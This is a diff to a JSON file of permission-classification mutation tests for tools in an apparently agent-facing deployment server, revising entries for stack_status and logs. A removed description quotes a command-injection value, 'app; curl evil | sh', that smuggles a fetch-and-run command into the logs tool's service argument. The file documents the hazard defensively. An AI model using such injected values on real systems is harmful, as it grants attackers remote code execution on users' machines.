@@ -74,18 +74,18 @@
       "minFailing": 1
     },
     {
-      "id": "brake-stack-status-stays-ask",
-      "property": "stack_status ADVANCES a planned/running stack job server-side (handleStackStatus tools_stack.go:451 → advance :479-484 → s.callTool :220 invokes provision/pg_create/… — LIVE-REPRODUCED: one call moved a planned job planned→running and attempted provision, stopped only at AUTH_REQUIRED). Flipping it back to allow re-opens the zero-prompt paid chain stack_plan→stack_status and must go red (ADR-004 AM-1, cross-model QE HIGH).",
+      "id": "stack-status-remains-observational",
+      "property": "After the engine fix, stack_status reads persisted job state without advancing steps; stack_apply remains the explicitly gated mutation. Reclassifying status as ask loses the read-only contract and must fail the golden test.",
       "file": "data/tools-classification.json",
       "mutation": {
-        "find": "\"stack_status\": {\n      \"effect\": \"mutating\",\n      \"permission\": \"ask\",",
-        "replace": "\"stack_status\": {\n      \"effect\": \"mutating\",\n      \"permission\": \"allow\","
+        "find": "\"stack_status\": {\n      \"effect\": \"read-only\",\n      \"permission\": \"allow\",",
+        "replace": "\"stack_status\": {\n      \"effect\": \"read-only\",\n      \"permission\": \"ask\","
       },
-      "minFailing": 2
+      "minFailing": 1
     },
     {
       "id": "brake-logs-stays-ask",
-      "property": "logs concatenates its user-controlled `service` arg RAW into a remote `docker compose logs <service>` executed over SSH (handleLogs tools.go:1758 → engine/logs.go:61 `cmd += \" \" + opts.Service` → Deployer.Exec logs.go:64 → session.CombinedOutput internal/deploy/ssh.go:117), so service=\"app; curl evil | sh\" is arbitrary RCE on the user's VM. Flipping it back to allow puts a zero-prompt command-injection path behind a SILENT allow and must go red (ADR-004 AM-2, shell-reach hazard axis, cross-model QE HIGH).",
+      "property": "The pinned engine quotes logs.service before remote execution, but logs still reaches SSH/compose and can disclose sensitive output. Flipping its classification from ask to allow violates the reviewed shell-reach boundary.",
       "file": "data/tools-classification.json",
       "mutation": {
         "find": "\"logs\": {\n      \"effect\": \"shell-reach\",\n      \"permission\": \"ask\",",
